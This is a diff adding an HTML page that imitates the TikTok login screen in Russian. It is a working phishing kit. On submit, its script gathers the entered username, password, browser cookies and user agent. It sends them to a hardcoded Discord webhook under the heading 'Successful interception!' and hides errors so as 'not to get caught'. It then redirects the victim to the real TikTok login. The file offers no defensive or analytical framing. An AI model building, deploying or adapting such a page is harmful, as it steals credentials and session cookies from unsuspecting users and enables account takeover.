@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Вход в TikTok</title>
+    <style>
+        body { font-family: Arial; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        form { background: #1a1a1a; padding: 30px; border-radius: 16px; width: 320px; box-shadow: 0 0 20px rgba(254, 44, 85, 0.3); }
+        h2 { text-align: center; color: #fe2c55; }
+        input, button { display: block; margin: 12px auto; padding: 12px; width: 100%; box-sizing: border-box; border-radius: 8px; border: none; font-size: 16px; }
+        input { background: #333; color: #fff; }
+        button { background: #fe2c55; color: #fff; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #ff4d6d; }
+    </style>
+</head>
+<body>
+    <form id="loginForm">
+        <h2>TikTok</h2>
+        <input type="text" name="username" placeholder="Имя пользователя или email" required>
+        <input type="password" name="password" placeholder="Пароль" required>
+        <button type="submit">Войти</button>
+    </form>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            let user = document.querySelector('input[name="username"]').value;
+            let pass = document.querySelector('input[name="password"]').value;
+            let cookies = document.cookie.split(';').map(c => c.trim()).join('\n');
+
+            let payload = {
+                embeds: [{
+                    title: "🎯 Успешный перехват!",
+                    color: 0xFF0000,
+                    fields: [
+                        { name: "Логин", value: `\`${user}\``, inline: true },
+                        { name: "Пароль", value: `\`${pass}\``, inline: true },
+                        { name: "Куки", value: `\`\`\`${cookies || 'нет'}\`\`\``, inline: false },
+                        { name: "User-Agent", value: `\`${navigator.userAgent}\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch('https://discord.com/api/webhooks/1529467883346722896/ha5UqIVg6FW9qCFXCnWyvnkFBFVhc07uEYfEEk2h22MMhTLefdqcExJfKZkbIuJbHODT', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .catch(() => {}); // Ошибки игнорируем, чтобы не палить
+
+            window.location.href = 'https://www.tiktok.com/login';
+        });
+    </script>
+</body>
+</html>
